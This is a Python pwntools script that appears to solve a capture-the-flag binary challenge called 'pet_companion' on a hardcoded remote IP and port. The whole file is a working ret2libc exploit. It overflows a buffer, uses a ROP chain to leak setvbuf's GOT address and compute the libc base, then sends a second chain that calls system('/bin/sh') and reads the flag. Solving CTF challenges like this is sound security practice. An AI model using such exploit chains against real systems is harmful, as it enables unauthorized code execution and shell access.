#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pet_companion'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '83.136.253.251', 53933

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

    offset = 72
    payload = flat({
        offset: [
            rdi,
            0x1,
            rsi_r15,
            elf.got['setvbuf'],
            0x0,
            elf.plt['write'],
            elf.sym['main']
        ]
    })
    io.sendlineafter(b':', payload)

    io.recvuntil(b'...\n\n')
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['setvbuf']

    offset = 72
    payload = flat({
        offset: [
            rdi,
            next(libc.search(b'/bin/sh\x00')),
            libc.sym['system']
        ]
    })
    io.sendlineafter(b':', payload)

    io.sendline(b'cat flag*')

    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()